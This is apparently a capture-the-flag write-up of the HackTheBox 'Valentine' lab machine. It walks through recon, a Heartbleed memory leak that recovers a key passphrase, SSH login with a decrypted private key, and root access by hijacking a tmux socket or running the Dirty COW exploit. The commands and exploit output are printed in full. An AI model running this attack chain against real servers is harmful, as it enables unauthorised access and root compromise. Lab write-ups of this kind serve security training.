1, Recon
port scan
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2024-12-07T08:18:09+00:00; 0s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

When I just come to index page, I only found
![[Pasted image 20241207054836.png]]

So I need to continue to enumerate the web-contents.
```
gobuster dir -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.79/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 38]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]
/encode               (Status: 200) [Size: 554]
/decode               (Status: 200) [Size: 552]
/omg                  (Status: 200) [Size: 153356]
/server-status        (Status: 403) [Size: 292]
```

Then I found 2 files from the directory `/dev`
`hype_key` and `notes.txt`
```
notes.txt
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

and from the hype_key, I can decode them

But it seems like a rabbit hole, from the image and the version of ssh, I guess there would a `heartbleed` vulnerablilty,
```
root@kali# searchsploit heartbleed
-------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                              |  Path
                                                                                                                                            | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)                                         | exploits/multiple/remote/32764.py
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                                                         | exploits/multiple/remote/32791.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                                                          | exploits/multiple/remote/32998.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                                                            | exploits/multiple/remote/32745.py
-------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result


searchsploit -m exploits/multiple/remote/32745.py
```

The script runs and grabs memory from the target server (it’s useful to remove lines of 0):
`python2 32745.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"`

I ran it a ton of times to collect a bunch of data:
```
for i in $(seq 1 100000); do python2 32745.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" > data_dump/data_dump$i; done
```

The use fdupes to remove duplicates:
```
apt install fdupes
fdupes -rf . | grep -v '^$' > files
xargs -a files rm -v
```

In this data, there were a few interesting bits:
```
The existence of /encode.php and /decode.php
decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
that decodes to heartbleedbelievethehype
something that looked like an md5, but didn’t crack easily
```

Then let's come back to the `http://10.10.10.79/dev/hype_key`, The file is a bunch of hex bytes.
```
root@kali# wget https://10.10.10.79/dev/hype_key --no-check-certificate
--2018-03-17 15:59:45--  https://10.10.10.79/dev/hype_key
Connecting to 10.10.10.79:443... connected.
WARNING: The certificate of ‘10.10.10.79’ is not trusted.
WARNING: The certificate of ‘10.10.10.79’ hasn't got a known issuer.
The certificate's owner does not match hostname ‘10.10.10.79’
HTTP request sent, awaiting response... 200 OK
Length: 5383 (5.3K)
Saving to: ‘hype_key’

hype_key                                      100%[==============================================================================================>]   5.26K  --.-KB/s    in 0s

2018-03-17 15:59:45 (38.7 MB/s) - ‘hype_key’ saved [5383/5383]

root@kali# cat hype_key | xxd -r -p
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----

root@kali# cat hype_key | xxd -r -p > hype_key_encrypted
```

We can use openssl to try to decrypt. It asks for a password… the decode of the base64 collected with `heartbleed`, `heartbleedbelievethehype` works:
`openssl rsa -in hype_key_encrypted -out hype_key_decrypted`

Then we need to force the algorithm during connection
`ssh -i hype_key_decrypted -o PubkeyAcceptedKeyTypes=+ssh-rsa hype@10.10.10.79`

We have known the version of this machine is very old
```
uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```
So of course we can try the kernel exploits, but we can try something easily and stable.

We see signed of tmux in a few places.
Process list, running as root:
```
hype@Valentine:~$ ps -ef | grep tmux
root       1022      1  0 Jul25 ?        00:00:54 /usr/bin/tmux -S /.devs/dev_sess
```

```
bash history:
hype@Valentine:~$ history
    1  exit
    2  exot
    3  exit
    4  ls -la
    5  cd /
    6  ls -la
    7  cd .devs
    8  ls -la
    9  tmux -L dev_sess
   10  tmux a -t dev_sess
   11  tmux --help
   12  tmux -S /.devs/dev_sess
   13  exit
   14  tmux ls
   15  ps -ef
   16  ps -ef |grep tmux
   17  uname -a
   18  tmus
   19  tmux
   20  tmux ls
   21  history
```

If we just run tmux ls, we’ll see no active sessions.
```
hype@Valentine:~$ tmux ls
failed to connect to server: Connection refused
```

That is to say, in line 5-7 of the history, the user goes into the /.devs directory. In line 9 we see him start tmux session with the socket dev_sess. He tried to attach to that session with -a t dev_sess (line 10), but that’s not the correct way to do it. Then he runs the help command (line 11), and gets the correct way to connect, using -S (line 12).

If we look at the permissions for the socket, it’s owned by room, but its group is hype, and the file is readable by group:
```
hype@Valentine:~$ ls -l /.devs
total 0
srw-rw---- 1 root hype 0 Jul 25 15:07 dev_sess
```

So we can connect to the session the same way hype did, with -S:
`tmux -S /.devs/dev_sess`
Then we can get the root shell.

Or we can try the dirty cow exploits.
After looking over a few, selected one that would add a root user to the passwd file:
```
root@kali# searchsploit -m exploits/linux/local/40839.c
  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
      URL: https://www.exploit-db.com/exploits/40839/
     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
File Type: C source, ASCII text, with CRLF line terminators

Copied to: ~/hackthebox/valentine-10.10.10.79/40839.c
```

Uploaded to the box, compile, and run:
```
hype@Valentine:/dev/shm$ gcc -pthread dc.c -o c -lcrypt

hype@Valentine:/dev/shm$ file c
c: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xe2dea237b60ba9dc122a44d0505f9796b0b8a159, not stripped
hype@Valentine:/dev/shm$ chmod +x c
hype@Valentine:/dev/shm$ ./c
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fifdjzBMn8d5E:0:0:pwned:/root:/bin/bash

mmap: 7f004ef9b000


hype@Valentine:/dev/shm$ su firefart
Password:

firefart@Valentine:/dev/shm# id
uid=0(firefart) gid=0(root) groups=0(root)
```

PS: in this place, kernel exploits would sometimes broken the machine and it would not reversible.